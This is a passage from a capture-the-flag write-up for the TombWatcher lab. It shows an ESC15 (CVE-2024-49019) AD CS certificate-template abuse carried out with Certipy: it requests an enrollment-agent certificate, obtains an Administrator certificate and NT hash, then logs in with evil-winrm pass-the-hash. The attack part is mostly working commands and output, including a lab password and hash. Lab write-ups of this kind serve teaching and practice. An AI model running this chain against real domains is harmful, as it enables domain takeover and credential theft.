        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    !![!] Vulnerabilities!!
      !!ESC15!!                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```
## Abusing ESC15
This vulnerability can be easily exploited by following the [certipy guide for ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)

The first step is to Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy. This certificate is for the attacker (cert_admin@tombwatcher.htb) to become an enrollment agent. 

```shell
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
    -dc-ip '10.10.11.72' -target 'tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

The second step consists of using the "agent" certificate to request a certificate on behalf of a target privileged user. This is an ESC3-like step, using the certificate from Step 1 as the agent certificate.

```shell
certipy req \
    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \         
    -dc-ip '10.10.11.72' -target 'tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER\Administrator'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

The last step is to use the administrator's pfx to obtain its NTLM hash:

```shell
faketime -f '+4h' certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:d07e4c3f08bc2029dac43ae7b4fe5bd0
```

We can finally winrm into the box as the Administrator and read the root flag:

```
evil-winrm -i 10.10.11.72 -u Administrator -H d07e4c3f08bc2029dac43ae7b4fe5bd0
```